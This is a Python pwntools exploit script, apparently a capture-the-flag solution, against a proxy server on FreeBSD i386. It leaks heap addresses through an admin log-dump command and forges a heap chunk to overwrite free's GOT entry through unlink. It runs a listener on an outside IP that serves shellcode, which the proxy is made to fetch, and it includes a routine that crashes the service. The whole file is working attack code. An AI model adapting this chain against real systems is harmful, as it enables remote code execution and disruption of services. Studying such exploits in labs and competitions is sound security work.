from pwn import *
from socket import *
import threading
PORT = 9992

def dump_access_log(interact=False,strip_str="A"*120):
	p = remote("192.168.210.129",PORT)
	cmd = "admincmd_proxy_dump_log"
	p.send(cmd)
	if interact:
		p.interactive()
	else:
		p.recvuntil("Dumping Logs......")
		p.recvuntil(strip_str)
		data = p.recv(8)
		heap1 = u32(data[:4])
		heap2 = u32(data[4:8])
		return heap1,heap2
		p.close()

def make_request(uri,interact=False,port=80):
	p = remote("192.168.210.129",PORT)
	URI = "http://{}:{}".format(uri,port)
	packet = "GET {}\r\n\r\n".format(URI)
	p.send(packet)
	sleep(0.1)
	if interact:
		p.interactive()
	else:
		p.close()

def open_shellcode_provider():
	s = socket(AF_INET,SOCK_STREAM)
	addr = ("110.76.94.32",15151)
	s.bind(addr)
	s.listen(5)

	log.progress("started server on port 15151")

	c,a = s.accept()
	log.success("connection from %s:%d"%a)

	c.send(shellcode)
	c.close()


def test_aslr():
	malloc_got = 0x804A11C
	make_request("A"*120)
	H1,H2 = dump_access_log()
	print("HEAP LEAK(FD): %x"%H1)
	print("HEAP LEAK(BK): %x"%H2)

def exploit():

	global shellcode
	#dup2 is 90
	free_got = 0x804A16C
	shellcode_d = shellcraft.i386.infloop()

	context.log_level = 'debug'
	shellcode = asm(shellcode_d)
	'''
	ptr->next->prev = ptr->prev;
    ptr->prev->next = ptr->next;
	'''
	fake_struct_addr = 0x2829a008
	shellcode_addr = 0xfa1ddf6c
	fake_struct = p32(shellcode_addr)+p32(free_got-0x80)
	fake_struct += shellcode
	fake_struct = fake_struct.ljust(120,"\x90")
	make_request(fake_struct)
	sleep(0.1)
	log.info("fake_struct is located at 0x%x"%fake_struct_addr)
	log.info("shellcode is located at 0x%x"%shellcode_addr)
	for i in range(29):
		make_request("A"*120)

	serv = threading.Thread(target=open_shellcode_provider)
	serv.start()

	url,port = "110.76.94.32",15151
	make_request(url,port=port)
	#last log should be used for exploit
	make_request("B"*120+p32(0xdeadbeef)+p32(fake_struct_addr-0x80))
	sleep(0.1)
	make_request("A"*10,interact=True) #this will trigger the exploit


def shutdown():
	try:
		make_request("A"*120+p32(0xdeadbeef)+p32(0xdeadbeef))
		dump_access_log()
	except:
		log.success("shut down proxy server")


if __name__ == "__main__":
	context.os = 'freebsd'
	context.arch = 'i386'
	exploit()
